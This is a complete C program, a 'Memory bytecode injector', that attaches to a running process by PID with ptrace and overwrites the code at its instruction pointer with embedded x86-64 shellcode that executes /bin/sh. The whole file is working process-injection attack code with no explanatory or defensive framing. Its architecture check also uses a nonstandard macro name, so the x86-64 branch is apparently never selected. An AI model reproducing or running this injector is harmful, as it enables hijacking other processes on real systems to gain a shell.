#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>

char shellcode[] = {
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
    "\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54"
    "\x5e\xb0\x3b\x0f\x05"
};

void header() {
    printf("----Memory bytecode injector-----\n");
}

int main(int argc, char **argv) {
    int i, size, pid;
    struct user_regs_struct reg;
    char *buff;

    header();

    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid = atoi(argv[1]);
    size = sizeof(shellcode);
    buff = (char *)malloc(size);
    memset(buff, 0x0, size);
    memcpy(buff, shellcode, size);

    ptrace(PTRACE_ATTACH, pid, 0, 0);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, 0, &reg);

#ifdef _x86_64_
    unsigned long addr = reg.rip;
    printf("Writing RIP 0x%llx, process %d\n", (unsigned long long)addr, pid);
#else
    unsigned long addr = reg.eip;
    printf("Writing EIP 0x%x, process %d\n", addr, pid);
#endif

    for (i = 0; i < size; i += sizeof(long)) {
        long data = *(long *)(buff + i);
        ptrace(PTRACE_POKETEXT, pid, addr + i, data);
    }

    ptrace(PTRACE_DETACH, pid, 0, 0);
    free(buff);

    return 0;
}